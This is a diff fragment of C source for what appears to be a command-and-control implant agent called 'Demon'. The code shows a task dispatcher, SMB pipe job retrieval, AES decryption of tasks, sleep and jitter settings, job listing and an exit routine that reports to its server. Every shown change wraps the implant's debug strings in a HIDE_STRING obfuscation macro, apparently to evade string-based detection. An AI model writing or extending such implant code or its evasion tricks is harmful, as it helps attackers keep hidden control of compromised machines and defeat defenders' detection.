@@ -56,7 +56,7 @@ VOID CommandDispatcher( VOID )
     UINT32   CommandID      = { 0 };
     UINT32   RequestID      = { 0 };
 
-    PRINTF( "Session ID => %x\n", Instance->Session.AgentID );
+    PRINTF( HIDE_STRING("Session ID => %x\n"), Instance->Session.AgentID );
 
     do {
         if ( ! Instance->Session.Connected ) {
@@ -89,7 +89,7 @@ VOID CommandDispatcher( VOID )
         // read from pipe to receive new tasks
         if ( ! SMBGetJob( &DataBuffer, &DataBufferSize ) )
         {
-            PUTS( "SMBGetJob failed" )
+            PUTS( HIDE_STRING("SMBGetJob failed") )
             continue;
         }
 #endif
@@ -104,7 +104,7 @@ VOID CommandDispatcher( VOID )
                 Instance->CurrentRequestID = RequestID;
 
                 if ( CommandID != DEMON_COMMAND_NO_JOB ) {
-                    PRINTF( "Task => RequestID:[%d : %x] CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", RequestID, RequestID, CommandID, CommandID, TaskBuffer, TaskBufferSize )
+                    PRINTF( HIDE_STRING("Task => RequestID:[%d : %x] CommandID:[%d : %x] TaskBuffer:[%x : %d]\n"), RequestID, RequestID, CommandID, CommandID, TaskBuffer, TaskBufferSize )
                     if ( TaskBufferSize != 0 ) {
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                         ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
@@ -133,7 +133,7 @@ VOID CommandDispatcher( VOID )
         else
         {
 #ifdef TRANSPORT_HTTP
-            PUTS( "TransportSend: Failed" )
+            PUTS( HIDE_STRING("TransportSend: Failed") )
             break;
 #endif
         }
@@ -157,12 +157,12 @@ VOID CommandDispatcher( VOID )
 
     Instance->Session.Connected = FALSE;
 
-    PUTS( "Out of while loop" )
+    PUTS( HIDE_STRING("Out of while loop") )
 }
 
 VOID CommandCheckin( PPARSER Parser )
 {
-    PUTS( "Checkin" )
+    PUTS( HIDE_STRING("Checkin") )
 
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_CHECKIN );
 
@@ -177,8 +177,8 @@ VOID CommandSleep( PPARSER Parser )
 
     Instance->Config.Sleeping = ParserGetInt32( Parser );
     Instance->Config.Jitter   = ParserGetInt32( Parser );
-    PRINTF( "Instance->Sleeping: [%d]\n", Instance->Config.Sleeping );
-    PRINTF( "Instance->Jitter  : [%d]\n", Instance->Config.Jitter );
+    PRINTF( HIDE_STRING("Instance->Sleeping: [%d]\n"), Instance->Config.Sleeping );
+    PRINTF( HIDE_STRING("Instance->Jitter  : [%d]\n"), Instance->Config.Jitter );
 
     PackageAddInt32( Package, Instance->Config.Sleeping );
     PackageAddInt32( Package, Instance->Config.Jitter );
@@ -187,7 +187,7 @@ VOID CommandSleep( PPARSER Parser )
 
 VOID CommandJob( PPARSER Parser )
 {
-    PUTS( "Job" )
+    PUTS( HIDE_STRING("Job") )
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_JOB );
     DWORD    Command = ParserGetInt32( Parser );
 
@@ -197,7 +197,7 @@ VOID CommandJob( PPARSER Parser )
     {
         case DEMON_COMMAND_JOB_LIST:
         {
-            PUTS( "Job::list" )
+            PUTS( HIDE_STRING("Job::list") )
             PJOB_DATA JobList = Instance->Jobs;
 
             do {
@@ -3314,7 +3314,7 @@ VOID KillDate( )
 // TODO: rewrite this. disconnect all pivots. kill our threads. release memory and free itself.
 VOID CommandExit( PPARSER Parser )
 {
-    PUTS( "Exit" );
+    PUTS( HIDE_STRING("Exit") );
 
     /* default is 1 == exit thread.
      * TODO: make an config that holds the default exit method */
@@ -3339,7 +3339,7 @@ VOID CommandExit( PPARSER Parser )
     if ( Parser )
     {
         /* Send our last message to our server...
-         * "My battery is low, and it’s getting dark." */
+         * "My battery is low, and it's getting dark." */
         Package    = PackageCreate( DEMON_EXIT );
         ExitMethod = ParserGetInt32( Parser );
 
